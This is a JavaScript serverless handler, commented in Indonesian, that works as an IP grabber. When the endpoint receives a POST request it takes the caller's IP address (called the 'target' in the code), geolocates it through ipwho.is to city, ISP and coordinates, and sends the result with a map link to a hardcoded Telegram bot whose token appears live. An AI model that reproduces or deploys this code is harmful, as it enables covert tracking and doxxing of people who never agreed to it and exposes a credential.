export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const BOT_TOKEN = "8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY"; // ganti
  const CHAT_ID = "7600526426";     // ganti

  try {
    // Ambil IP target dari request
    const ipHeader = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ip = ipHeader.split(',')[0].trim();

    console.log("IP target:", ip);

    // Gunakan ipwho.is HTTPS agar stabil
    const geoRes = await fetch(`https://ipwho.is/${ip}`);
    const geoData = await geoRes.json();

    console.log("Geo data:", geoData);

    const info = `
📡 *IP Terdeteksi*
🌐 IP: ${geoData.ip}
🌍 Negara: ${geoData.country || "Unknown"}
🏙 Kota: ${geoData.city || "Unknown"}, ${geoData.region || "Unknown"} ${geoData.postal || ""}
🛰 ISP: ${geoData.connection?.isp || "Unknown"}
🏢 Org: ${geoData.connection?.org || "Unknown"}
⚡ ASN: ${geoData.connection?.asn || "Unknown"}
⌚ Zona Waktu: ${geoData.timezone?.id || "Unknown"}
📌 Koordinat: ${geoData.latitude || "Unknown"},${geoData.longitude || "Unknown"}
🔗 https://www.google.com/maps?q=${geoData.latitude || ""},${geoData.longitude || ""}
    `;

    // Kirim ke Telegram
    const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: info,
        parse_mode: "Markdown"
      })
    });

    const telegramResult = await telegramRes.json();
    console.log("Telegram result:", telegramResult);

    res.status(200).json({ status: "ok", telegramResult });

  } catch (err) {
    console.error("Error:", err);
    res.status(500).json({ error: err.message });
  }
}
